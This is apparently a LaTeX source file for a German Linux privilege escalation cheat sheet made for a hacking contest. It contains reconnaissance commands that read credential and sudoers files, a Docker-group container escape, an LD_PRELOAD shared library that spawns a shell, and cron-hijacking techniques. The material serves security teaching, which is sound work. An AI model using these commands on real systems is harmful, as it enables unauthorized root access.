@@ -1,0 +1,323 @@
+\documentclass[
+    parskip=half,
+    landscape
+]{scrartcl}
+
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{microtype}
+\usepackage[sfdefault,scale=0.85]{FiraSans}
+\usepackage[scale=0.85]{FiraMono}
+
+\usepackage[
+    top=15mm,
+    left=15mm,
+    right=15mm,
+    bottom=25mm,
+]{geometry}
+
+\usepackage[ngerman]{babel}
+\usepackage[babel,german=quotes]{csquotes}
+\usepackage{tabularx}
+\usepackage{xltabular}
+\usepackage[table,xcdraw]{xcolor}
+\usepackage{graphicx}
+\usepackage{svg}
+\usepackage{datetime}
+\usepackage{multirow}
+\usepackage[hidelinks]{hyperref}
+\usepackage{tikz}
+\usepackage{pgfplots}
+\usepackage{wrapfig}
+\usepackage{pgfplotstable}
+\usetikzlibrary{positioning,matrix,calc,shapes.misc}
+\usepackage{comment}
+\usepackage[german]{varioref}
+\usepackage[german]{cleveref}
+\usepackage[shortlabels]{enumitem}
+\usepackage{booktabs}
+\usepackage{suffix}
+\usepackage{multicol}
+\usepackage{xparse}
+\usepackage{pdflscape}
+\usepackage{scrlayer-scrpage}
+\clearpairofpagestyles
+
+\providecommand{\tightlist}{%
+   \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}
+
+\ifoot{Privilege Escalation CheatSheet für HackerContest}
+\ofoot{Konrad Langenberg, Jonas Franz und Simon Hilchenbach}
+
+\RedeclareSectionCommand[
+  %runin=false,
+  afterindent=false,
+  beforeskip=\baselineskip,
+  afterskip=.1\baselineskip]{section}
+\RedeclareSectionCommand[
+  %runin=false,
+  afterindent=false,
+  beforeskip=\baselineskip,
+  afterskip=.1\baselineskip]{subsection}
+
+\let\originalhref\href
+\renewcommand\href[2]{\originalhref{#1}{\color{blue}{#2}}}%
+
+\usepackage{listings}
+\lstset{ 
+  basicstyle=\ttfamily,
+  breakatwhitespace=false,
+  breaklines=true,
+  captionpos=b,
+  commentstyle=\color{green!50!black},
+  keepspaces=true,
+  keywordstyle=\color{blue},
+  numbers=none,
+  numbersep=5pt,
+  numberstyle=\scriptsize\ttfamily,
+  showspaces=false,
+  showstringspaces=false,
+  showtabs=false,
+  stringstyle=\color{yellow!70!black},
+  frame=none,
+  belowskip=-0.3\baselineskip
+}
+\lstset{literate=%
+  {Ö}{{\"O}}1
+  {Ä}{{\"A}}1
+  {Ü}{{\"U}}1
+  {ß}{{\ss}}1
+  {ü}{{\"u}}1
+  {ä}{{\"a}}1
+  {ö}{{\"o}}1
+}
+
+\begin{document}
+\begin{tikzpicture}[overlay,remember picture]
+%    \node[anchor=north west,inner sep=5mm] at (current page.north west) {\Huge CheatSheet Privilege Escalation};
+    \node[anchor=north west,inner sep=7mm] at (current page.north west) {\includesvg[width=.4\paperwidth]{img/cheatsheet_logo.svg}};
+
+    \node[anchor=south east,inner sep=20mm,opacity=0.05] at (current page.south east) {\includesvg[width=80mm]{img/tux.svg}};
+\end{tikzpicture}
+
+\begin{multicols}{3}
+\section{Informationssammlung}
+\begin{itemize}
+    \tightlist
+    \item Benutzerinformationen
+    \begin{itemize}
+        \item \texttt{id}
+        \item \texttt{sudo -l}
+        \item \texttt{cat /etc/passwd}
+        \item \texttt{cat /etc/group}
+        \item \texttt{cat /etc/sudoers}
+    \end{itemize}
+    \item Kernel und Distribution
+    \begin{itemize}
+        \item \texttt{uname -a}
+        \item \texttt{cat /etc/os-release}
+        \item \texttt{lsb\_release -a}
+    \end{itemize}
+    \item Netzwerkkonfiguration
+    \begin{itemize}
+        \item \texttt{ifconfig} / \texttt{ip addr show}
+        \item \texttt{netstat -tlpn} / \texttt{ss -antp}
+        \item \texttt{iptables -L}
+        \item \texttt{cat /etc/resolv.conf}
+    \end{itemize}
+    \item Dateien und Dienste
+    \begin{itemize}
+        \item \texttt{cat /etc/crontab} / \texttt{cat /etc/cron*/*}
+        \item \texttt{find / -uid 0 -perm -u=s -type f 2>/dev/null}
+        \item \texttt{grep -Hirn pass /*}
+        \item \texttt{ls -laR /root/}
+        \item \texttt{ls -laR /home/}
+        \item \texttt{ps aux}
+        \item \texttt{df -h}
+    \end{itemize}
+\end{itemize}
+
+\section{Grundlagen}
+\subsection*{Linux Berechtigungsmodell}
+Alle Aktionen unter Unix-Systemen finden im Kontext eines Prozesses statt.
+Ein Prozess hat einen Benutzer und mind. eine Gruppe zugewiesen, die die Berechtigungen dieses Prozesses steuern.
+Die Berechtigungen werden an Kindprozesse vererbt.
+Der Benutzer mit den höchsten Berechtigungen ist der \texttt{root}-Benutzer mit der ID 0.
+
+\subsection*{User-IDs}
+Unix-Benutzer und -Gruppen werden durch eine Ganzzahl identifiziert, haben in der Regel aber auch einen Namen zugewiesen.
+Bei den IDs unterscheidet man mehrere Typen, wobei die beiden wichtigen die UID/GID und die EUID/EGID.
+In der UID/GID sind der \enquote{echte} Benutzer und die \enquote{echte} Gruppe gespeichert, in EUID/EGID (effective) der Benutzer und die Gruppe, die zur Rechteprüfung hinzugezogen werden.
+
+\subsection*{Zugriffsrechte}
+Zugriffsrechte auf Dateien und Verzeichnisse werden nach Benutzer, Gruppe und andere aufgeschlüsselt.
+Es können Lese- , Schreib- und Ausführungsberechtigungen (`rwx`) erteilt werden.
+Wenn eine Datei ausgeführt wird, werden im Normalfall die IDs vom Elternprozess vererbt.
+Neben diesen 9 Bits gibt es noch spezielle Bits wie das setuid-Bit (erkennbar an dem s statt x bei der `ls -l` Ausgabe)  bei Benutzer und Gruppe, welches dafür sorgt, dass bei Ausführung die EUID/EGID auf den Benutzer bzw. die Gruppe gesetzt wird.
+
+\section{Spezielle Gruppen}
+\subsection*{\texttt{video}-Gruppe}
+Ein Benutzer in der \texttt{video}-Gruppe hat Zugriff auf den Bildschirm des Systems.
+Die aktuell auf dem Bildschirm angezeigten Pixel können unter aus \texttt{/dev/fb0} mit dem Befehl \texttt{cat /dev/fb0 > /tmp/screen.raw} gelesen werden.
+Öffnet man diese Datei dann in GIMP im Format \emph{Raw image data} (Datei $\to$ Öffnen $\to$ dann unten die Checkbox \enquote{Dateityp automatisch erkennen} abwählen und \enquote{Rohe Bilddaten} als Dateityp wählen), lässt sich nach der Dateiauswahl mit einem passenden \emph{Image type} und der richtigen Auflösung der Bildschirminhalt anzeigen.
+Die Bildschirmauflösung gibt der Befehl \texttt{fbset} aus.
+
+\subsection*{\texttt{docker}-Gruppe}
+% Docker isoliert Prozesse auf Dateisystem- sowie Netzwerkebene (und weitere) unter dem selben Kernel.
+% \href{https://en.wikipedia.org/wiki/Docker_(software)}{Der Wikipedia-Artikel} liefert einen guten Überblick.
+
+Benutzer in der \texttt{docker}-Gruppe dürfen Dockercontainer starten und verwalten.
+
+Da der Docker-Daemon mit \texttt{root}-Rechten läuft, können wir einen Container mit \texttt{root}-Rechten starten, der uns das Ausbrechen auf den Host erlaubt:
+
+\begin{lstlisting}[language=bash]
+docker run -it --privileged -v /:/root alpine chroot /root
+\end{lstlisting}
+
+Um auch die anderen Isolationen wie die Netzwerkisolation zu umgehen, brauchen wir Zugriff auf die Linux-Namespaces.
+Das erreichen wir mit diesem Befehl:
+\begin{lstlisting}[language=bash]
+nsenter -t 1 -m -u -i -n /bin/bash
+\end{lstlisting}
+Dann haben wir die gleichen Privilegien wie der \texttt{init}-Prozess.
+
+% Spalte 3
+\section{Fehlkonfiguration}
+
+\begin{itemize}
+\tightlist
+\item
+  \texttt{login}: Benutzer ohne Passwort / mit unsicherem Passwort
+\item
+  \texttt{sudo}:
+
+  \begin{itemize}
+  \tightlist
+  \item
+    Privilegienerhöhung ohne Passwort (Option NOPASSWD)
+  \item
+    \texttt{env\_keep}: Reicht Umgebungsvariablen weiter, kann man in
+    Kombination mit \texttt{LD\_PRELOAD} ausnutzen.
+  \end{itemize}
+\item
+    \texttt{ssh}: Privater SSH-Key ungeschützt unter \texttt{\textasciitilde/.ssh/id\_*}
+\end{itemize}
+
+\section{Capabilities}
+
+Capabilities teilen die Privilegien des \texttt{root}-Benutzers in verschiedene Teile auf, 
+die pro Prozess einzeln aktiviert und deaktiviert werden können. 
+So muss nicht jeder Prozess vollständige \texttt{root}-Rechte bekommen.
+%Beispielsweise
+%hat das Programm \texttt{ping} die Capability \texttt{cap\_net\_raw} um
+%Rohe ICMP-Pakete verschicken zu können.
+Eine Liste mit allen Capabilities ist
+\href{https://man7.org/linux/man-pages/man7/capabilities.7.html}{im
+Manual} zu finden.
+
+Mit \texttt{getcap <Pfad zum Programm>} lässt
+sich anzeigen, welche Capapilities ein bestimmtes Programm nutzen darf.
+Mit dem \texttt{setcap}-Befehl können Capabilities gesetzt werden.
+Voraussetzung ist der Besitz der \texttt{CAP\_SETFCAP}-Capability.
+
+\section{LD\_PRELOAD}
+
+\texttt{LD\_PRELOAD} ist eine Umgebungsvariable, die dem dynamischen
+Linker angibt, welche Libraries vor Programmstart zusätzlich geladen
+werden sollen. Dadurch kann man eigene Libraries injizieren, die dann
+im Kontext eines anderen Programms ausgeführt werden.
+
+Das ist dann besonders nützlich, wenn wir es in eine höhere
+privilegierte Umgebung eingefügt bekommen, \hbox{z. B.} einen Service, über den unprivilegierte Benutzer Umgebungsvariablen modifizieren können.
+
+Die dynamischen Linker führen \texttt{LD\_PRELOAD} nicht auf
+suid-Binaries durch. Der musl-Linker ignoriert diese jedoch nur während
+der GNU-Linker LD\_PRELOAD löscht. Dadurch kann es auf musl-Systemen
+möglich sein, eigene Libraries in Kindprozesse von suid-Prozessen zu
+injecten, wenn UID = EUID.
+
+Kompilieren einer dynamischen Library; \texttt{inject.c}:
+\begin{lstlisting}[language=C]
+#include <stdlib.h>
+#include <unistd.h>
+void _init () {
+  unsetenv("LD_PRELOAD");
+  char *const argv[] = {"/bin/bash", NULL};
+  execv(argv[0], argv);
+}
+\end{lstlisting}
+Kompilieren der Bibliothek durch
+\begin{lstlisting}[language=Bash]
+  gcc -nostartfiles -shared -o inject.so inject.c
+\end{lstlisting}
+Injizieren der Library via
+\begin{lstlisting}[language=Bash]
+LD_PRELOAD=/tmp/inject.so ls
+\end{lstlisting}
+Es werden nicht, wie vorgesehen, die Dateien aufgelistet, sondern eine neue Shell gespawnt.
+
+\section{Cron-Hijacking}
+
+Cron ist ein Systemdienst, der periodisch einen Befehl ausführt. Das
+linuxwiki \href{https://www.linuxwiki.de/crontab}{bietet einen guten
+Überblick über die Funktionsweise}.
+
+Es gibt verschiedene Möglichkeiten, wie man ein System mittels Cron
+übernehmen kann:
+
+\begin{itemize}
+% \tightlist
+\item
+  \texttt{crontab}-Datei ist nicht gegen Schreibzugriffe Dritter
+  abgesichert → Eigenen Befehl hinzufügen und mit Zeitplan \texttt{* * * * *} so
+  bald wie möglich ausführen.
+\item
+  Dritte können in \texttt{/etc/cron.d} weitere crontab-Dateien anlegen;
+  eine Liste von Pfaden, die Cron unter GNU/Linux durchsucht, ist
+  \href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology\%20and\%20Resources/Linux\%20-\%20Privilege\%20Escalation.md\#cron-jobs}{hier}
+  zu finden.
+\item
+  Ein Shell-Skript, welches von einem Cronjob ausgeführt wird, ist nicht
+  gegen Schreibzugriffe Dritter abgesichtert. Als Angreifer kann man
+  dieses dann modifizieren und bis zur Ausführung am nächsten Zeitpunkt
+  warten.
+\end{itemize}
+Eine Alternative zu Cron sind Systemd Timers.
+
+% \section{Systemd Timers}
+
+% Ein Systemdienst, der ähnlich wie Cron Befehle periodisch ausführt. Mit
+% dem Befehl \texttt{systemctl\ list-timers\ -\/-all} lassen sich alle
+% Timer anzeigen. Diese kann man dann auf ähnliche Möglichkeiten zur
+% Ausnutzung untersuchen, wie bei Crontab.
+
+\section{Kernel Exploits}
+
+Kernel Exploits nutzen Schwachstellen im Linux-Kernel aus und sind ein besonders effektiver Angriff bei älteren Versionen.
+Da der Kernelcode i.d.R. mit höheren Rechten, als der Code im Usermodus läuft, eignen sich solche Exploits gut zum Ausbauen der Rechte auf dem Zielsystem.
+Eine Sammlung mit existierenden Exploits gibt es
+\href{https://github.com/xairy/linux-kernel-exploitation\#exploits}{hier}.
+%
+Erwähnenswert ist die Kernel-Lücke DirtyCOW, welche häufig bei älteren Systemen benutzt werden kann.
+Alle Infos dazu gibt es \href{https://dirtycow.ninja/}{auf der offiziellen Website}.
+
+\section{Further Reading}
+
+\begin{itemize}
+\tightlist
+\item \href{https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS}{\texttt{linpeas.sh}} -- Ein PrivEsc-Skript, welches automatisch ein System auf mögliche Schwachstellen prüft
+\item
+  \href{https://gtfobins.github.io/}{GTFOBins} -- Eine Liste mit
+  verschiedenen Methoden, um mit Linux-Standardwerkzeugen Privilegien zu
+  erhöhen
+\item
+  \href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology\%20and\%20Resources/Linux\%20-\%20Privilege\%20Escalation.md}{PayloadsAllTheThings
+  - Linux Privilege Escalation}
+\item
+  \href{https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist}{Linux
+  Privilege Escalation Checklist}
+\end{itemize}
+
+\end{multicols}
+
+\end{document}
